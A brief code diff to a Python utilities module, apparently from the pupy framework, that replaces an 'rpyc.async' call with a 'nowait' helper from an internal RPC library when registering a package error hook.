@@ -14,10 +14,11 @@ import zlib
 import cPickle
 import gc
 
-import rpyc
 import umsgpack
 
 import pupy
+
+from network.lib.rpc import nowait
 
 logger = pupy.get_logger('utils')
 
@@ -125,7 +126,7 @@ def register_package_request_hook(hook):
 
 
 def register_package_error_hook(hook):
-    pupy.remote_print_error = rpyc.async(hook)
+    pupy.remote_print_error = nowait(hook)
 
 
 def unregister_package_error_hook():
